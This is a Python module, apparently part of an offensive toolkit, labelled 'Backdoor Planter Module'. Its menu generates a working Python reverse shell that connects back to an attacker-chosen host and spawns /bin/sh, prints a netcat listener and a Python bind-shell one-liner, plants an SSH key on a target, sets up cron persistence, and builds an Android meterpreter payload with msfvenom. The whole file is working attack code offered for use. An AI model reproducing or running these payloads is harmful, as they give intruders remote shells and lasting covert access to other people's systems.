#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_backdoor():
    print('''
    ╔═══════════════════════════════════════════════════════╗
    ║           BACKDOOR PLANTER MODULE                     ║
    ╚═══════════════════════════════════════════════════════╝
    ''')
    print("[1] Python Reverse Shell")
    print("[2] Netcat Listener Setup")
    print("[3] SSH Backdoor Key")
    print("[4] Cron Persistence")
    print("[5] Android Payload")
    choice = input("\n[BACKDOOR] Select: ").strip()
    if choice == "1":
        lhost = input("[BACKDOOR] LHOST: ").strip()
        lport = input("[BACKDOOR] LPORT: ").strip() or "4444"
        payload_lines = [
            "import socket,subprocess,os",
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
            "s.connect((" + repr(lhost) + "," + lport + "))",
            "os.dup2(s.fileno(),0)",
            "os.dup2(s.fileno(),1)",
            "os.dup2(s.fileno(),2)",
            'p=subprocess.call(["/bin/sh","-i"])'
        ]
        with open("reverse_shell.py", "w") as f:
            f.write("\n".join(payload_lines))
        print("[BACKDOOR] Saved to reverse_shell.py")
        print("[BACKDOOR] Listener: nc -lvnp " + lport)
        log_action("BACKDOOR", "Python revshell " + lhost + ":" + lport)
    elif choice == "2":
        lport = input("[BACKDOOR] Listener port: ").strip() or "4444"
        print("[BACKDOOR] Start listener:")
        print("    nc -lvnp " + lport)
        print("[BACKDOOR] Python listener:")
        listener_cmd = 'import socket,subprocess;s=socket.socket();s.bind(("0.0.0.0",' + lport + '));s.listen(1);c,a=s.accept();subprocess.call(["/bin/sh","-i"],stdin=c,stdout=c,stderr=c)'
        print("    python3 -c " + repr(listener_cmd))
        log_action("BACKDOOR", "Netcat listener on " + lport)
    elif choice == "3":
        target = input("[BACKDOOR] user@host: ").strip()
        print("[BACKDOOR] ssh-keygen -t ed25519 -f backdoor_key")
        print("[BACKDOOR] ssh-copy-id -i backdoor_key.pub " + target)
        log_action("BACKDOOR", "SSH backdoor on " + target)
    elif choice == "4":
        cmd = input("[BACKDOOR] Command to persist: ").strip()
        print("[BACKDOOR] crontab -e")
        print("    * * * * * " + cmd)
        log_action("BACKDOOR", "Cron persistence")
    elif choice == "5":
        print("[BACKDOOR] pkg install termux-api")
        print("[BACKDOOR] msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o backdoor.apk")
        log_action("BACKDOOR", "Android payload")
